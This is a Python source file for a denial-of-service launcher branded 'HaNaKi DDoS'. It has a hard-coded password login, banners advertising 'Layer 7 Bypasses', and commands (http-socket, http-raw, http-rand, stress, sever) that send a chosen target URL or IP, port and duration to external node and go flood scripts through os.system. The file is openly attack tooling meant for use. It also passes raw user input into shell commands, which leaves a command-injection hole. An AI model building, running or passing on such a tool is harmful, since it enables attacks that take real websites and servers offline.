from colorama import Fore, Back, Style
import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(Fore.YELLOW + """
   \033[1;37m ╦ ╦╔═╗╔╗╔╔═╗╦╔═╦ ╔═╗╔╦╗╔═╗╔═╗╦╔═  
   \033[1;37m ╠═╣╠═╣║║║╠═╣╠╩╗║ ╠═╣ ║ ╠═╣║  ╠╩╗      
   \033[1;32m ╩ ╩╩ ╩╝╚╝╩ ╩╩ ╩╩ ╩ ╩ ╩ ╩ ╩╚═╝╩ ╩    \033[1;33mby Hà Minh Triết
                                           """)
    time.sleep(1.8)
    clear()

def si():
    print("\033[1;37mZalo/Call: 0987979662")

def menu(): 

    clear()
    
    print('\033[1;38mHaNaKi DDoS By HaMinhTriet ')
    print(Fore.YELLOW + """

\033[1;33m                            ╦ ╦╔═╗╔╗╔╔═╗╦╔═\033[1;35m╦ ╔═╗╔╦╗╔═╗╔═╗╦╔═  
\033[1;33m                            ╠═╣╠═╣║║║╠═╣╠╩╗\033[1;35m║ ╠═╣ ║ ╠═╣║  ╠╩╗      
\033[1;33m                            ╩ ╩╩ ╩╝╚╝╩ ╩╩ ╩\033[1;35m╩ ╩ ╩ ╩ ╩ ╩╚═╝╩ ╩
\033[1;33m                        Hanaki lLegendary ,\033[1;35m Dominating Since 2022
\033[1;33m                ╚═════╦════════════════════\033[1;35m═════════════════════╦═════╝
\033[1;33m                ╔═════╩════════════════[HNK\033[1;35mL]═══════════════════╩═══════╗
\033[1;33m               ╔╝--------------------------\033[1;35m-----------------------------╚╗
\033[1;33m               ║     Welcome To The Software\033[1;35m HaNaKi AT V1 Software       ║
\033[1;33m               ║              Powerful Layer\033[1;35m 7 Bypasses                  ║
\033[1;33m               ╚═══════════╦════════════════\033[1;35m═══════════╦═════════════════╝
\033[1;33m                     ╔═════╩════════════════\033[1;35m═══════════╩════════╗
\033[1;33m                     ║   - - - [Admin TRIET \033[1;35m& TOAN & ] - - -    ║
\033[1;33m                     ╚══════════════════════\033[1;35m════════════════════╝
\033[1;33m                   ╔═════╩══════════════════\033[1;35m═════════════╩═══════╗
\033[1;33m                   ║             Powered By \033[1;35mHaNaKi               ║
\033[1;33m                   ║ Copyright @2022 HaNaKiA\033[1;35mT All Rights Reserved║
\033[1;33m                   ╚════════════════════════\033[1;35m═════════════════════╝
""")

def main():
    menu()
    while(True):
        cnc = input(''' \033[1;33m[\033[1;33mHaNaKi>\033[1;33m[\033[1;35mminhtriet\033[1;33m]\033[1;33m$\033[1;37m ''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            ()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            ()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            ()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
            ()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            ()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            ()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            ()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            ()


        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-socket <url> <per> <time>')
                print(Fore.RED +'Example: http-socket https://HaMinhTriet.XCute 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-raw <url> <time>')
                print(Fore.RED +'Example: http-raw https://HaMinhTriet.XCute 60')

        elif "http-requests" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-REQUESTS {url} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-requests <url> <time>')
                print(Fore.RED +'Example: http-requests https://HaMinhTriet.XCute 60')

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print(Fore.RED +'Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print(Fore.RED +'MODE: [1] TCP')
                print(Fore.RED +'      [2] UDP')
                print(Fore.RED +'      [3] HTTP')
                print(Fore.RED +'Example: stress 1.1.1.1 80/443 3 1250 60 5')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-rand <url> <time>')
                print(Fore.RED +'Example: http-rand https://HaMinhTriet.XCute 60')

        elif "sever" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run sever.go -site {url} -data {method}')
            except IndexError:
                print(Fore.RED +'Usage: sever <url> METHODS<GET/POST>')
                print(Fore.RED +'Example: sever https://HaMinhTriet.XCute GET')

        elif "info" in cnc:
            print(f'''
[https://www.facebook.com/HaMinhTriet.XCute]

            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
def login():
    clear()
    user = "haminhtriet"
    passwd = "hmt"
    username = input("\033[1;34mEnter Username_$>>\033[1;37m ")
    password = getpass.getpass(prompt='\033[1;32mEnter Password_$>>\033[1;37m ')
    if username != user or password != passwd:
        print("Chào Mừng Bạn HaNaKi")
        sys.exit(1)
    elif username == user and password == passwd:
        print("\033[1;33mChờ Xí....Đang Load Vào")
        print("\033[1;35mChào Mừng Bạn HaNaKi")
        time.sleep(3.5)
        ascii_vro()
        main()

login()

